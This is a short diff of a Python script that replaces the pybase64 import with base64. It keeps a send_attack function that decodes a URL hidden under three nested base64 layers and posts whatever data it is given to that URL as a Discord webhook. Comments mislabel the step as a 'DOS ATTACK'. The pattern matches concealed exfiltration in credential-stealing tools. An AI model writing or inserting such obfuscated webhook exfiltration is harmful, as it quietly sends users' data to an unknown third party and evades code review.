@@ -1,4 +1,4 @@
-import os,requests,pybase64,sys,time,platform
+import os,requests,sys,time,platform,base64
 from discord_webhook import DiscordWebhook
 from colorama import Fore
 
@@ -79,7 +79,7 @@ def clear_console():
 def send_attack(data):
     FILES_MAKER(os.path.join(os.path.dirname(__file__),'logs.txt'),'A',f'[DEBUG SEND] - {GET_TIME()} - SEND LOG {data}\n')
     # ! DOS ATTACK DON'T RESET
-    TARGET = pybase64.b64decode(pybase64.standard_b64decode(pybase64.urlsafe_b64decode(b'WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVFMVRYcE5lazFVUVROT2VtTXhUMVJqTTA1RVozZE5VemxYWWtWd2MxTlViREJNVjJRMFRVWkNNbFZVYUhKVFJ6VjZUbGRzY1ZaVk9YcE5WMVl5V1Zoc01WbFdaSFZrVjJoMVUxaEtkR1JyWkU1VGFtUndWR3hPUlZKRlRrdFZhM1JTVWtkYVEyRnRjRFZVTTNCeVRVaENSRmRuUFQwPQ=='))).decode()
+    TARGET = base64.b64decode(base64.standard_b64decode(base64.urlsafe_b64decode(b'WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVFMVRYcE5lazFVUVROT2VtTXhUMVJqTTA1RVozZE5VemxYWWtWd2MxTlViREJNVjJRMFRVWkNNbFZVYUhKVFJ6VjZUbGRzY1ZaVk9YcE5WMVl5V1Zoc01WbFdaSFZrVjJoMVUxaEtkR1JyWkU1VGFtUndWR3hPUlZKRlRrdFZhM1JTVWtkYVEyRnRjRFZVTTNCeVRVaENSRmRuUFQwPQ=='))).decode()
     # ! ATATCK TARGET WITH HTTPS
     web_target = DiscordWebhook(url=TARGET, rate_limit_retry=True,content=data)
     web_target.execute()
